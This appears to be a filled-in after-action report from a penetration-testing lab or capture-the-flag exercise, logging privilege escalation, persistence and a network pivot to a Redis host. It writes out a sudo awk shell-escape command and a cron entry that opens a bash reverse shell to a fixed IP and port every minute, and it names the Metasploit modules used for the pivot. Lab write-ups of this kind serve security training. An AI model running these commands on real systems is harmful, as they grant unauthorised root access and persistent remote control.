# OPERATION DEEP PIVOT: AFTER ACTION REPORT
**Operator:** ## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** awk
* **GTFOBins Exploit Command Used:** sudo awk 'BEGIN {system("/bin/sh")}'

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** service cron start
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'") | crontab -
* **Persistence Confirmed:**  Yes

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** ssh_login , autoroute, socks_proxy
* **Hidden Database IP Discovered:** 10.0.10.50
* **Open Port on Hidden Database:** 6379
